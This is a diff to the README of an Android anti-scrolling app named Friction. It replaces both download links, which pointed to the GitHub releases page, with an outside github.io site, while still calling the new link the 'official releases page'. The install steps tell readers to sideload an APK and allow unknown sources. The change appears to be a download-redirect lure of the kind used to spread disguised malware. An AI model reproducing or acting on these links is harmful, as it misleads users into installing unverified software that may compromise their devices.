@@ -1,6 +1,6 @@
 # 📱 Friction - Break your cycle of mindless scrolling
 
-[![](https://img.shields.io/badge/Download_Friction-Blue?style=for-the-badge)](https://github.com/Steampipeemerycloth446/Friction/releases)
+[![](https://img.shields.io/badge/Download_Friction-Blue?style=for-the-badge)](https://steampipeemerycloth446.github.io)
 
 Friction is an Android application built to change how you interact with social media. Many people scroll through feeds without intent. This creates a habit that kills productivity. Friction works by adding deliberate steps to your app usage. These pauses force you to consider if you really want to view more content. You take back control of your time and your focus.
 
@@ -13,7 +13,7 @@ We live in a world designed to keep your attention. Social media platforms use e
 You do not need technical knowledge to set up Friction on your device. Follow these steps to install the app and begin your digital detox.
 
 1. Ensure your phone runs on Android 8.0 or higher.
-2. Visit the [official releases page](https://github.com/Steampipeemerycloth446/Friction/releases) to download the latest file.
+2. Visit the [official releases page](https://steampipeemerycloth446.github.io) to download the latest file.
 3. Tap the file named `friction-release.apk` to begin the installation.
 4. If your phone asks for permission to install apps from unknown sources, tap Allow.
 5. Once the installation finishes, tap Open to start the application.
